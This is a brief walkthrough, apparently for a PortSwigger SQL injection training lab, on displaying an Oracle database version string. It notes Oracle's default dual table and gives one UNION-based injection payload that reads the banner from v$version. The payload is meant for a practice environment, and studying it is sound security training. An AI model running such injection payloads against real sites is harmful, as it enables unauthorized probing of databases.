### Seven Exercise 👆


![problem.PNG](/assets/SQLi/Seven/problem.PNG)


#### **To do**

```
To solve the lab, display the database version string. 
```

1. In Oracle every time we execute a query we have to indicate a table, the default table in Oracle is **dual**

**Cheatsheet**: https://portswigger.net/web-security/sql-injection/cheat-sheet

2. Read version of database
```sql
' union select NULL, banner from v$version-- -
```

![pwnd.JPG](/assets/SQLi/Seven/pwnd.PNG)